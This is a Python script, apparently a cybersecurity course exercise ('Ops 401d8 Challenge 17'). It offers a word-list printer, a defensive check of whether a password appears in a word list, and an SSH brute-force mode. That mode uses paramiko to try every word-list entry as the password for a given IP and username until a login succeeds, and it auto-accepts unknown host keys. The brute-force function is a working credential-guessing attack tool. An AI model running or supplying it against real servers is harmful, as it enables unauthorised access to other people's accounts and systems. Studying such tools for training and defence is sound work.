#!/usr/bin/env python3

# Script Name:                  Ops 401d8 Challenge 17
# Author:                       David Prutch
# Date of latest revision:      08/01/2023
# Purpose:                      Mode 1: Offensive; Dictionary Iterator

                                # Accepts a user input word list file path and iterates through the word list, assigning the word being read to a variable.
                                    # Add a delay between words.
                                    # Print to the screen the value of the variable.
                                    # Mode 2: Defensive; Password Recognized

                                # Accepts a user input string.
                                    # Accepts a user input word list file path.
                                    # Search the word list for the user input string.
                                    # Print to the screen whether the string appeared in the word list.

                                # Adding the following functionality to ops_416_Automated_Brute_Force_Wordlist_Attack_Tool_Part_1.py
                                    # Authenticate to an SSH server by its IP address.
                                    # Assume the username and IP are known inputs and attempt each word on the provided word list until successful login takes place.

# Import Libraries
import time
from getpass import getpass
import paramiko

# Define Variables

# Define Functions
# Function for Offensive Mode: Dictionary Iterator
def offensive_mode():
    # Prompt user for the word list file path
    word_list_path = input("Enter the word list file path: ")
    # Read the word list from the file
    with open(word_list_path, 'r') as file:
        words = file.read().splitlines()
    
    # Iterate through each word in the list
    for word in words:
        # Display the word on the screen
        print(word)
        # Add a delay to make it easier to read
        time.sleep(1)

# Function for Defensive Mode: Password Recognized
def defensive_mode():
    # Prompt user for input password string and word list file path
    user_input = getpass("Enter a password string: ")
    word_list_path = input("Enter the word list file path: ")
    # Read the word list from the file
    with open(word_list_path, 'r') as file:
        words = file.read().splitlines()

    # Check if the user input string exists in the word list
    if user_input in words:
        print("Password matches a list item. You may want to change your password.")
    else:
        print("Password does not match a list item")

# Function for SSH Brute Force
def ssh_brute_force():
    # Prompt user for SSH server IP address and username
    ssh_ip = input("Enter the SSH server IP address: ")
    ssh_username = input("Enter the SSH username: ")

    # Prompt user for the word list file path
    word_list_path = input("Enter the word list file path: ")
    # Read the word list from the file
    with open(word_list_path, 'r') as file:
        words = file.read().splitlines()

    # Iterate through each word in the list and attempt SSH login
    for word in words:
        word = word.rstrip()
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(ssh_ip, username=ssh_username, password=word)

            print(f"Login successful! Password found: {word}")
            # Exit the loop if successful login
            break 
        except paramiko.AuthenticationException:
            print(f"Login failed for password: {word}")
# Main
while True:
    print("Choose a mode:")
    print("1. Offensive (Dictionary Iterator)")
    print("2. Defensive (Password Recognized)")
    print("3. SSH Brute Force")
    print("4. Exit")

    # Read the chosen mode number
    mode = int(input("Enter mode number: "))

    if mode == 1:
        # Call offensive_mode function
        offensive_mode()
    elif mode == 2:
        # Call defensive_mode function
        defensive_mode()
    elif mode == 3:
        # Call ssh_brute_force function
        ssh_brute_force()
    elif mode == 4:
        # Exit the loop
        break
    else:
        # Print an error message if an invalid mode number is entered
        print("Invalid mode number. Please try again.")
#End